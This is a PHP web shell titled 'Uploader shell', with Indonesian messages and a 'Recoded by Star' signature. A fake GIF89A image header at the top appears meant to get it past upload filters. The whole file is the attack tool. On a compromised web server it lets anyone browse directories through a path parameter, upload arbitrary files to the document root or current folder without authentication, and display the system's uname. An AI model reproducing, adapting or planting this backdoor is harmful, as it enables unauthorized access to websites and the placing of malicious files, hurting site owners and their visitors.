GIF89A;
�jpg


<title>Uploader shell</title>
<center>
<a href="?" style="color:lime;">Home</a>
<form method='post' enctype='multipart/form-data'>
	 <input type="radio" name="tipe" value="root">Home root<input type="radio" name="tipe" value="biasa">Biasa <br><br> choose your file:&nbsp;&nbsp;&nbsp;<input type="file" name= "idx_file"> <input type="submit" name="upload" value="upload"> </form><br>

	  </form><tr><td>Current Path </font>:<?php
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_POST['upload'])) {
    switch($_POST['tipe']){
       case "root": 
           $root = $_SERVER['DOCUMENT_ROOT']; 
           $files = $_FILES['idx_file']['name']; 
           $dest = $root.'/'.$files; 	
           if(is_writable($root)) { 	
              if(@copy($_FILES['idx_file']['tmp_name'], $dest)) { 			

$web = "http://".$_SERVER['HTTP_HOST']."/"; 			
echo "<br><br>Sukses -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>"; 		
} else { 			
    echo "<br>gagal upload root >:("; 		}
 	} else { 		
 	echo "<font color='red'>klo ga bisa silahkan pakai yang biasa :)</font>"; 		} 
        	case "biasa": 
 	           $files = $_FILES['idx_file']['name']; 
 	          	if(@copy($_FILES['idx_file']['tmp_name'], $files)) { 
 	          	echo "<br><br>Sukses Upload => dir ini"; 		
 	          	} else { 			
 	  echo "<script> alert('gagal upload >:(');</script>"; 		} 		
 	  break; 
 	  default:
 	     echo "<script>alert('Harap pilih opsi');</script>"; 
 	     break; } } 
 	     	echo ' <br /><br /><br /></b></b><div class="fot">Recoded by Star</b> <br /><br />'.php_uname().' <br /><br />';
?>
